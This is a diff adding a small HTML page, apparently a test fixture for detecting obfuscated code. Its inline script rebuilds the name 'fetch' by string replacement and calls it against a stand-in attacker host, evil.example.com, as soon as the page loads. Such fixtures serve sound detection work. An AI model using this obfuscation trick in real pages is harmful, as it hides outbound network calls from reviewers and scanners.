@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Replace Manipulation Attack</title>
+</head>
+<body>
+  <div id="root">Display</div>
+  <script>
+    // Attack: String replace to construct fetch
+    const base = 'fXtXcXh';
+    const fn = base.replace(/X/g, '');
+    window[fn]('https://evil.example.com');
+  </script>
+</body>
+</html>
